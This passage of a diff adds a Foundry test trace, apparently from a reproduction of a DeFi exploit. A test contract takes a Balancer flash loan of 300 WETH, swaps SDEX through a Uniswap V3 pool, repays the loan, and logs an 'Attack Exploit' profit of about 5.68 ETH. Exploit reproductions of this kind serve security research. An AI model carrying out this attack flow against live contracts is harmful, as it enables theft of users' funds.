+    │   │   │   ├─ [62715] 0xC7cbFF2a23D0926604F9352f65596e65729b8a17::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 1270785781943626791086803 [1.27e24], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b5de8ab7e27f6e7a1fff3e5b337584aa43961beef002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [8062] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6910532528747182970 [6.91e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xC7cbFF2a23D0926604F9352f65596e65729b8a17, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6910532528747182970 [6.91e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2539] SDEX::balanceOf(0xC7cbFF2a23D0926604F9352f65596e65729b8a17) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 110933204646354143031650572 [1.109e26]
+    │   │   │   │   ├─ [12276] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(1270785781943626791086803 [1.27e24], -6910532528747182970 [-6.91e18], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b5de8ab7e27f6e7a1fff3e5b337584aa43961beef002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [8220] SDEX::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC7cbFF2a23D0926604F9352f65596e65729b8a17, 1270785781943626791086803 [1.27e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC7cbFF2a23D0926604F9352f65596e65729b8a17, value: 1270785781943626791086803 [1.27e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [539] SDEX::balanceOf(0xC7cbFF2a23D0926604F9352f65596e65729b8a17) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 112203990428297769822737375 [1.122e26]
+    │   │   │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 1270785781943626791086803 [1.27e24], param3: -6910532528747182970 [-6.91e18], param4: 185101461909130131834038547 [1.851e26], param5: 466763672288567730840988 [4.667e23], param6: -121190 [-1.211e5])
+    │   │   │   │   └─ ← [Return] 1270785781943626791086803 [1.27e24], -6910532528747182970 [-6.91e18]
+    │   │   │   └─ ← [Return] 6910532528747182970 [6.91e18]
+    │   │   ├─ [3262] WETH::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 300000000000000000000 [3e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 300000000000000000000 [3e20])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   ├─ [534] WETH::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   └─ ← [Return] 68806375619580487410091 [6.88e22]
+    │   ├─ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param2: 300000000000000000000 [3e20], param3: 0)
+    │   └─ ← [Stop] 
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 5684731200402649461 [5.684e18]
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 5684731200402649461 [5.684e18]
+    ├─ [0] console::log("Attack Exploit: %s.%s ETH", 5, 684731200402649461 [6.847e17]) [staticcall]
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 372.08ms (6.80ms CPU time)
+
+Ran 2 test suites in 373.85ms (705.02ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
